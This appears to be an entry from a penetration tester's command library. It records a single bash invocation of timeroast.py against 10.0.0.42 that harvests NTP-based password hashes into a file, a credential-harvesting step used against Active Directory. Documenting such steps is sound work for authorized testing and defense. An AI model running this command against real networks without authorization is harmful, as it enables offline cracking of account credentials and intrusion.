---
id: 7d0cd10d-7814-4cc5-8f1d-6fb95764481a
name: Run timeroast.py to get NTP hashes
type: command
executor: bash
data: sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
output: null
created_at: '2023-04-06T03:56:05.039491+00:00'
updated_at: '2023-04-10T20:36:14.046391+00:00'
---

# Run timeroast.py to get NTP hashes

```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
```
